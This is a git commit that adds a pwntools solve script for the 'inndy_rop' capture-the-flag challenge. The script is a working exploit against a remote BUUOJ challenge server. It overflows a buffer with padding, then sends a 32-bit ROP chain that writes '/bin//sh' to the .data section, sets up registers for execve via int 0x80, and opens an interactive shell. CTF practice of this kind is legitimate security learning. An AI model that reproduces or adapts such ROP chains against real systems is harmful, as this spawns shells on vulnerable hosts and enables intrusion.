0d3dd2ee30024c0c60a74b7f595fd053bc826c94
我是个狒狒 <115911678+woshigefeifei@users.noreply.github.com>
2024-07-17 10:29:33 +0800

    Add files via upload

---
+++ inndy_rop/solve.py
@@ -0,0 +1,44 @@
+from pwn import *
+from struct import pack
+
+#sh=process("./timu")
+sh=remote("node5.buuoj.cn",25142)
+elf=ELF("./timu")
+
+p=0x10*b'a'
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x080b8016) # pop eax ; ret
+p += b'/bin'
+p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea064) # @ .data + 4
+p += pack('<I', 0x080b8016) # pop eax ; ret
+p += b'//sh'
+p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x080492d3) # xor eax, eax ; ret
+p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080481c9) # pop ebx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x080de769) # pop ecx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x080492d3) # xor eax, eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0806c943) # int 0x80
+
+sh.sendline(p)
+sh.interactive()
